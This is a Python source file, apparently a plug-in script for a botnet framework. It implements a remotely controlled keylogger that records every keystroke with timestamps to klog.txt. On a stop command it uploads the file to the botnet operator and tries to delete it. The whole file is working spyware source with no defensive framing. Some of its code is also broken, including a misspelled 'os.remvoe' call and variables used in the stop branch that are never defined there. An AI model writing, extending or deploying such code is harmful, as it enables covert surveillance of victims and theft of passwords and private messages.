import threading
import logging
import datetime
import os
from pynput import keyboard

from .. import BotNet, Context, UserException
from ..utils import simple_serializer


_logger = logging.getLogger(f"--> {__name__}  ")

@BotNet.default_script(script_version="0.0.1")
def keylogger(context: Context) -> str:
    """`
    Starts a new schedule for a command.

    syntax:

    example command:


    Note:
    
    checks if command[1] is off or on. if on , a thread to start keylogging will start 
    if off , keylogger thread will stop. this function will handle multiple keyloggers running."""



    keylogger_thread_name = "keylog"  # for threading , this way we can prevent multiple keyloggers running at the same time
    

    command, err = simple_serializer(context.command, [str])
    if err:
        raise UserException(err)
    

    # if user requested keylogger to be turned on
    if command[0] == 'start':
        
        if keylogger_thread_name in (i.name for i in threading.enumerate()):
            _logger.error('keylogger is already turned on')
            return 'keylogger is already turned on'

        keylogger_util = KeyLogger()

        _logger.info('turning keylogger on...')
        keylogger_thread = threading.Thread(
            target=keylogger_util.start, name=keylogger_thread_name)
        
        keylogger_thread.start()
        keylogger_thread.join() # ?
        _logger.info('keylogger turned on.')
        
        return 'Key logger turned on.'

    # if user requested keylogger to be turned off
    if command[0] == 'stop':
        try:
            keylogger_thread.join()
            keylogger_util.stop()
            data = context.engine.send_file("klog.txt", context.system_info())
            if not data:
                return 'upload failed'
            else:
                _logger.info('deleting klog.txt file')
                try:
                    os.remvoe('klog.txt')
                except:
                    _logger.error('keylogger file txt deletion failed')
                finally:
                    return 'keylogger off. logger txt file => {0}'.format(data[1])

        except:
            return 'keylogger is already off.'



class KeyLogger:
    '''this class is for keylogger utility , you should only start this class from a threading object.
    this way , the keylogger and the app itself will both run at the same time.'''

    def __init__(self) -> None:
        self.filename = "klog.txt"

    def pressed_key(self, key):
        """if a key is presses , this function will be called and it will write data."""
        with open(self.filename, 'a', errors='ignore') as logs:
            logs.write('{0} {1}\n'.format(
                str(datetime.datetime.now()), str(key)))

    def start(self):
        """starting point of keylogger."""
        global _keyboard_listener
        _keyboard_listener = keyboard.Listener(on_press=self.pressed_key,)
        _keyboard_listener.start()

    def stop(self):
        """stops listener"""
        global _keyboard_listener
        _keyboard_listener.stop()
